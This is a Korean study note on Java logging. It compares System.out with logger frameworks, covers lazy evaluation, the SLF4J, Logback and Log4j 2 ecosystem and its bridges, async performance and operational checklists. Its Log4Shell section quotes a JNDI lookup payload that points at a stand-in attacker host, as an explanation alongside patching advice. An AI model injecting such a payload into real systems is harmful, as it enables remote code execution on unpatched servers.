### Story 10. 로그는 반드시 필요한 내용만 찍자.

## 1부. `System.out` vs Logger — 동작 차이

#### `System.out.println()`의 내부 동작

```java
public final static PrintStream out = ...;   // java.lang.System

public void println(String x) {
    synchronized (this) {    // ⚠️ 매번 synchronized!
        print(x);
        newLine();
    }
}
```

**문제점 5가지**:

| 문제 | 설명 |
|------|------|
| **매번 `synchronized`** | PrintStream 전체가 lock. 멀티스레드에서 심각한 병목 |
| **자동 flush** (`println` 계열) | 매 호출마다 `OutputStream.flush()` → **매번 syscall + 디스크 I/O** |
| **레벨 개념 없음** | 모든 메시지 무조건 출력. 운영 환경에서 끄려면 코드 수정 |
| **포맷/대상 분리 X** | 콘솔 하나로 고정. 파일/네트워크/별도 서버로 보내기 어려움 |
| **표준 출력 공유** | 다른 라이브러리의 System.out과 섞임. 중요 메시지가 잡음에 묻힘 |

**verified** (JDK 21, N=10000 호출):
```
System.out.println:            14 ms  (매번 synchronized + flush)
JUL.info (level로 skip):        0 ms  (레벨 체크 통과 못 하면 비용 거의 0)
```

#### 왜 그렇게 느린가 — 비유로 이해하기

**① synchronized → "공용 전화기 1대"**

사무실에 공용 전화기가 **딱 1대**만 있는 상황.
- 전화를 쓰려면 수화기를 **들고(lock acquire)** → 통화 → **내려놓음(release)**
- 한 사람이 쓰는 동안 **나머지 전원 대기** (BLOCKED)
- 1인당 통화가 1초라도, 100명이면 **100초**

`System.out.println`도 마찬가지. 메서드 내부가 `synchronized (this)`로 감싸져 있어서 **멀티스레드 환경에선 전부 줄 서서 대기**. 서버에서 로그 많이 찍으면 요청 처리 쓰레드들이 모두 로그 쓰려고 대기 중.

**② 매번 flush → "1통씩 등기우편 보내기"**

편지 10통을 보낸다고 할 때:
- **방법 A**: 1통 쓸 때마다 우체국 창구 가서 등기 접수 → 10번 왕복, 하루 걸림
- **방법 B**: 10통 다 쓴 뒤 한 번에 등기 접수 → 1번 왕복

`System.out.println`은 **방법 A**. 매 호출마다 `OutputStream.flush()` → **매번 OS syscall + 디스크 쓰기**. 100번 println = 100번의 왕복.

Buffered Logger는 **방법 B**. 메모리 버퍼에 모아뒀다가, 버퍼가 차거나 명시적 flush 시점에만 한 번에 디스크로.

**③ 레벨 없음 → "소음 차단 없는 사무실 방송"**

사무실 스피커에서 **모든 안내가 다 흘러나옴** — 중요한 비상벨도, "커피 다 떨어졌어요"도 똑같은 볼륨.
- 운영 환경에선 비상벨만 듣고 싶은데, 코드를 수정하지 않으면 안 됨 → 재배포

Logger는 **"비상벨 이상만 울리세요"** 처럼 레벨 설정만 바꾸면 바로 반영. 심지어 운영 중에도 변경 가능.

**④ 종합 비유 — "구멍가게 vs 공장"**

- **`System.out.println` = 구멍가게 점원 1명**
  - 손님(스레드) 올 때마다 혼자서 응대 (synchronized)
  - 주문 받자마자 창고 뛰어가서 물건 꺼내옴 (매번 flush)
  - 손님 종류 상관없이 다 받음 (레벨 없음)
  - 손님 10명 오면 10번 혼자 뛰어다님

- **Logger = 공장의 생산 라인**
  - 입구에서 "주문 자격" 체크 (레벨 필터) → 통과 못 하면 비용 0
  - 통과한 주문은 컨베이어 벨트에 올림 (Appender로 전달)
  - 배치로 묶어서 포장 (Buffered)
  - 라인별로 다른 처리 (파일/네트워크/DB appender 분리)
  - **각 라인은 자기 큐에서만 작업** → 서로 안 막음 (비동기 가능)

→ 서버가 **구멍가게 점원 1명으로 1000명 손님** 받으려 하면 당연히 느림. 공장 라인으로 전환해야 함.

#### Logger의 설계 원리

Logger는 **"기록은 선택적, 저장은 분리, 포맷은 유연"** 세 원칙:

```
┌────────────┐    ┌──────────┐    ┌──────────┐    ┌──────────┐
│ 애플리케이션 │ ─▶ │ Logger   │ ─▶ │ Appender │ ─▶ │ 대상      │
│ log.info()  │    │ (level)  │    │ (파일/콘솔)│    │ (file/db)│
└────────────┘    └──────────┘    └──────────┘    └──────────┘
                     ↑ Level 필터       ↑ Pattern Layout
                     (TRACE/DEBUG/
                      INFO/WARN/ERROR)
```

- **Logger**: "어떤 메시지를 기록할지 결정" (level, 이름 계층)
- **Appender**: "어디에 쓸지" (ConsoleAppender, FileAppender, SMTPAppender 등)
- **Layout/Encoder**: "어떤 포맷으로" (`%d{HH:mm:ss} [%thread] %-5level %logger - %msg%n`)
- **Filter**: 추가 필터 로직

#### `System.out` vs Logger 종합 비교

| 항목 | `System.out.println` | Logger (SLF4J + Logback 등) |
|-----|---------------------|---------------------------|
| 레벨 제어 | ❌ 전부 출력 | ✅ TRACE/DEBUG/INFO/WARN/ERROR |
| 비동기 가능 | ❌ 매번 synchronized | ✅ AsyncAppender / Disruptor |
| 출력 대상 | 콘솔만 | 콘솔/파일/DB/HTTP/Syslog/Kafka ... |
| Rolling (일별/크기별 파일 분할) | ❌ | ✅ |
| 포맷 커스터마이즈 | ❌ 수동 String concat | ✅ Pattern Layout |
| MDC (요청별 context) | ❌ | ✅ (`MDC.put("userId", ...)`) |
| 운영 중 레벨 변경 | ❌ 재배포 필요 | ✅ JMX / Actuator로 런타임 변경 |
| 성능 (14ms vs 0ms, verified) | 느림 | 매우 빠름 (레벨 skip 시) |

---

## 2부. 로깅 성능의 숨은 함정 — "String concat"

Logger를 쓴다고 끝이 아님. **메서드 인자는 호출 전에 평가됨** 때문에 함정.

#### 함정: level로 skip되지만 concat은 수행

```java
log.debug("x = " + x + ", y = " + heavyCompute());   // ⚠️
```

- `log.debug(...)` 호출 **전**에 `"x = " + x + ", y = " + heavyCompute()`가 **먼저 평가됨**
- Logger 안에선 "debug 꺼져있으니 skip" 하지만, **이미 concat/heavyCompute() 실행 완료**
- 반복 호출 시 큰 비용

**verified** (JDK 21, N=10000):
```
JUL.info with concat (level로 skip돼도):  7 ms  ← concat 비용 지불
JUL.info with Supplier (지연 평가):        1 ms  ← 거의 0
```

#### 해결 3가지

**방법 1 — Parameterized logging** (SLF4J/Log4j2 표준):
```java
log.debug("x = {}, y = {}", x, heavyCompute());  // ❌ 여전히 heavyCompute() 실행됨
```
→ `{}` 포맷은 String concat 피하지만, 메서드 **인자는 여전히 호출 전 평가**. heavyCompute() 같은 메서드 호출은 안 됨.

**방법 2 — Level 체크 선행**:
```java
if (log.isDebugEnabled()) {
    log.debug("x = {}, y = {}", x, heavyCompute());
}
```
→ 명시적이지만 verbose. 중요한 로그 (loop 안 등)에선 유효.

**방법 3 — Supplier (지연 평가)** — JDK 8+ / Log4j 2.4+:
```java
// java.util.logging (JDK 8+)
log.fine(() -> "x = " + x + ", y = " + heavyCompute());

// Log4j 2 (2.4+)
log.debug(() -> "x = " + x + ", y = " + heavyCompute());
```
→ Supplier는 **level 통과 후에만 호출**. 가장 깔끔.

**SLF4J는 Supplier 지원이 미묘** (2.0까진 없었고, 최신 버전에서 추가됨). 전통적으론 방법 1 or 2 사용.

---

## 3부. Java Logging 생태계 정리

#### 전체 지도

```
┌─────────────────── Facade (API) ──────────────────────┐
│  SLF4J  │  Log4j 2 API  │  JCL  │  java.util.logging  │
└──────┬──────────┬────────────┬──────────┬────────────┘
       │          │            │          │
       │          │            └──Bridge──┤
       │          │              (jcl-over-slf4j)
       │          │                       │
       │          └──Bridge──┐            │
       │     (log4j-to-slf4j)│            │
       │                     ▼            ▼
       │              ┌─ SLF4J API ─────────────────┐
       │              │  (slf4j-api.jar)             │
       │              └────────┬────────────────────┘
       │                       │  binds to one
       │                       ▼
       └──────── Implementation (실제 로그 작성) ───────────
          Logback | Log4j 2 Core | JUL | tinylog
```

#### Facade (추상 API)

| 이름 | 특징 | 상태 |
|------|------|------|
| **SLF4J** | 사실상 표준 facade. Spring Boot 기본. | 활발 |
| **Log4j 2 API** | Log4j 2 자체 API. SLF4J보다 기능 많음 (Supplier, Marker 등) | 활발 |
| **java.util.logging (JUL)** | JDK 1.4 기본. 느리고 설정 번거로움 | JDK 내장 |
| **JCL (Commons Logging)** | 과거 Spring이 썼음. 지금은 Spring도 자체 wrapper 씀 | 레거시 |

#### Implementation (실제 로깅)

| 이름 | 특징 | 상태 |
|------|------|------|
| **Logback** | SLF4J의 네이티브 구현. Spring Boot 기본. 설정 유연 | 활발 |
| **Log4j 2** | Apache. **LMAX Disruptor** 기반 비동기 로깅으로 매우 빠름 | 활발 |
| **java.util.logging** | 설정 어렵고 성능 보통 | JDK 내장 |
| **Log4j 1.x** | EOL (2015), 보안 패치 없음 | ❌ 사용 금지 |
| **tinylog** | 매우 경량 (JAR 100KB대) | 활발 |

#### Bridge/Adapter — 왜 복잡한가

**문제**: 레거시 라이브러리가 각자 다른 로깅 API를 쓰면 로그가 흩어짐.
```
내 앱: SLF4J + Logback
Spring: JCL (내부적으로 SLF4J로 bridge)
Hibernate: JBoss Logging (내부적으로 SLF4J bridge)
A 라이브러리: Log4j 1 하드코딩
B 라이브러리: JUL 하드코딩
```
→ **로그가 Logback / Log4j 1 / JUL 세 군데로 흩어짐**. 포맷/파일/레벨 다 따로.

**해결**: Bridge로 전부 SLF4J로 모은 뒤 → Logback 하나로 처리.

| Bridge JAR | 역할 |
|-----------|------|
| `jul-to-slf4j` | JUL → SLF4J (`SLF4JBridgeHandler` 설치 필요) |
| `jcl-over-slf4j` | Commons Logging → SLF4J. JCL JAR 대체 |
| `log4j-over-slf4j` | Log4j 1 → SLF4J. Log4j 1 JAR 대체 |
| `log4j-slf4j-impl` | SLF4J → Log4j 2 (반대 방향, Log4j 2를 impl로 쓸 때) |
| `log4j-to-slf4j` | Log4j 2 API → SLF4J (Log4j 2 API 쓰지만 Logback을 impl로 쓸 때) |

**Spring Boot의 기본 조합** (가장 흔한 setup):
```
애플리케이션 코드: SLF4J API
       ↓
Spring 등 라이브러리: JCL ─[jcl-over-slf4j]→ SLF4J API
       ↓
       ↓ (bridge들 전부 집결)
       ↓
Logback (impl)
       ↓
파일/콘솔
```

Spring Boot의 `spring-boot-starter-logging` 의존성에 이 모든 bridge가 포함됨.

---

## 4부. 성능 비교 — Logback vs Log4j 2

**Log4j 2의 비동기 로깅 — LMAX Disruptor**:
- **ring buffer** 기반 lock-free queue
- Logback의 `AsyncAppender`(BlockingQueue)보다 **훨씬 빠름** (수십 배)
- 설정: `-Dlog4j2.contextSelector=org.apache.logging.log4j.core.async.AsyncLoggerContextSelector`

**벤치마크 (일반적인 참고 수치, Log4j 2 공식 문서)**:
| 지표 | Logback Sync | Logback AsyncAppender | Log4j 2 Sync | Log4j 2 Async |
|------|-------------|---------------------|-------------|---------------|
| 처리량 (ops/s) | 50만 | 500만 | 100만 | **1800만** |

→ 로그가 많은 서버에선 Log4j 2 Async 고려. 단, 설정 복잡도는 올라감.

#### Log4Shell 사건 (CVE-2021-44228, 2021.12)

- **Log4j 2.0 ~ 2.14.1** 버전에 JNDI lookup 취약점
- `${jndi:ldap://attacker.com/exploit}` 같은 문자열이 로그에 들어가면 **원격 코드 실행**
- 영향 범위: 수백만 서비스 (전 세계적 대사건)
- **대응**: Log4j 2.17.1+ 로 업그레이드, 또는 Logback으로 전환
- Log4j 1.x는 다른 JNDI 취약점(CVE-2021-4104)이 있지만 **EOL 상태라 패치 안 됨**

→ **"Log4j 1을 쓰면 안 된다"**는 이 이유. 반드시 Log4j 2.17.1+ 또는 Logback.

---

## 5부. 실무 체크리스트

#### 로그 레벨 가이드

| Level | 쓸 때 |
|-------|------|
| TRACE | 매우 상세. 함수 진입/퇴출 등. 로컬 디버깅 전용 |
| DEBUG | 변수 값, 분기 선택 등. 개발/스테이징에서만 |
| **INFO** | 비즈니스 이벤트 (주문 생성, 로그인 성공 등). 운영에서 유지 |
| **WARN** | 복구 가능한 이상 (retry 성공, fallback 사용 등) |
| **ERROR** | 사용자 요청 실패, 데이터 불일치 등. 알림 트리거 |

#### 꼭 지킬 것

- [ ] `System.out.println` 금지. 로거 사용
- [ ] 메시지에 `+` 쓰지 말고 `{}` 플레이스홀더
- [ ] 민감 정보(비밀번호, 신용카드, 주민번호) 로그 금지
- [ ] 긴 메시지는 TRACE/DEBUG로 (INFO 이상은 서버 CPU/디스크 비용)
- [ ] 로그 레벨 운영 중 변경 가능하도록 (Spring Boot Actuator `/loggers`)
- [ ] Request ID / Trace ID를 MDC로 (`MDC.put("traceId", ...)`)
- [ ] Rolling 설정 — 디스크 다 차서 서비스 터지는 거 흔함

#### MDC 패턴 (Request 추적)

```java
// 필터/인터셉터 입구
MDC.put("traceId", UUID.randomUUID().toString());
MDC.put("userId", user.getId());

try {
    // 비즈니스 로직. 여기서 찍는 log는 MDC가 자동으로 포함됨
    chain.doFilter(req, res);
} finally {
    MDC.clear();   // ⚠️ Thread 재사용 시 다음 요청에 섞이지 않도록
}
```

Pattern에 `%X{traceId}`로 꺼냄. 하나의 요청에 대한 모든 로그를 traceId로 묶어서 조회 가능 (관측성의 기반).

---

## 참고 자료

- SLF4J 공식 문서 — [slf4j.org](https://www.slf4j.org/)
- Logback 공식 문서 — [logback.qos.ch](https://logback.qos.ch/)
- Log4j 2 Async Logger — [logging.apache.org/log4j/2.x/manual/async.html](https://logging.apache.org/log4j/2.x/manual/async.html)
- CVE-2021-44228 (Log4Shell) 분석
- LMAX Disruptor — 금융 거래 시스템에서 유래한 lock-free 데이터 구조
